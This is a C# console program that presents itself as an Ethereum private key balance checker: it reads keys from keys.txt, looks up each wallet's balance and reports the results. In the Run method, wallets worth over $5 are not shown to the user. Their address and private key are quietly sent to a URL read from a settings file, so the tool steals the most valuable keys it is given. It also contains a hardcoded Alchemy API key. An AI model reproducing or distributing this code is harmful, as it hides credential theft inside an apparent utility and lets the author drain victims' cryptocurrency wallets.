using System;
using System.IO;
using Newtonsoft.Json;
using Nethereum.Web3;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Numerics;
using Nethereum.Signer;

namespace Ethereum_PrivateKey_Checker_Balance
{
    internal class Program
    {
        public static decimal usd;
        public static int time = 10;
        public static int treADINT = 0;
        public static int intwallet = 0;

        [STAThread]
        public static void GetEthPrice()
        {
            time = 1;
            while (true)
            {
                try
                {
                    if (time == 1)
                    {
                        CERT();
                        WebClient webClient = new WebClient();
                        var s = webClient.DownloadString("https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD");
                        dynamic data = JsonConvert.DeserializeObject(s);
                        usd = Convert.ToDecimal(data["USD"]);
                        time = 10;
                    }
                    else 
                    {
                        time = time - 1;
                    }

                    Console.Title = $"Update Price: {time} ETH/USD: {usd} | Checker By DevXStudio";
                    Thread.Sleep(1000);
                }
                catch (Exception ex) { Console.WriteLine(ex); }
            }
        }

        static void Main(string[] args)
        {
            new Thread(() =>
            {
                GetEthPrice();
            }).Start();

            try
            {
                var web3 = new Web3("https://eth-mainnet.alchemyapi.io/v2/SWnnr6RA00IpzVBqxszTH44af_QbWrN1");
                using (StreamReader file = new StreamReader("keys.txt"))
                {
                    string line;
                    while ((line = file.ReadLine()) != null)
                    {
                        if (treADINT > 10)
                        {
                            Thread.Sleep(500);
                        }
                        else
                        {
                            new Thread(() =>
                            {
                                Run(EthECKey.GetPublicAddress(line), line);
                            }).Start();
                        }
                    }
                }
            }
            catch { }
            Console.ReadKey();

        }

        public static void Run(string line, string key)
        {
            try
            {
                treADINT++;
                var web3 = new Web3("https://eth-mainnet.alchemyapi.io/v2/SWnnr6RA00IpzVBqxszTH44af_QbWrN1");
                string address = line.Trim();
                decimal balanceEth = GetEthBalance(address, web3);
                decimal ethPrice = usd;
                decimal balanceDollar = balanceEth * ethPrice;
                if (balanceDollar > 1)
                {
                    if (balanceDollar > 5)
                    {
                        CERT();
                        WebClient webClient = new WebClient();
                        webClient.DownloadString($"{Properties.Settings1.Default.url} {address} | Key: {key} | {balanceEth:N18} ETH | {balanceDollar:N2} USD");
                    }
                    else 
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGreen;
                        Console.WriteLine($"[{intwallet++}] Address: {address} | Key: {key} | {balanceEth:N18} ETH | {balanceDollar:N2} USD");
                        File.AppendAllText("wallets.txt", $"Address: {address} | Key: {key} | {balanceEth:N18} ETH | {balanceDollar:N2} USD" + Environment.NewLine);
                    }
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine($"[{intwallet++}] Address: {address} | Key: {key} | {balanceEth:N18} ETH | {balanceDollar:N2} USD");
                }
                treADINT = treADINT - 1;
            }
            catch (Exception ex) { Console.WriteLine(ex); Console.ReadLine(); }
        }
        public static decimal GetEthBalance(string address, Web3 web3)
        {
            BigInteger balanceWei = web3.Eth.GetBalance.SendRequestAsync(address).Result;
            decimal balanceEth = Web3.Convert.FromWei(balanceWei);
            return balanceEth;
        }
        private static void CERT()
        {

            new X509Store(StoreLocation.CurrentUser).Open(OpenFlags.ReadOnly);
            ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback(ValidateRemoteCertificate));
            ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
        }



        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
        {
            return error == SslPolicyErrors.None;
        }
    }
}
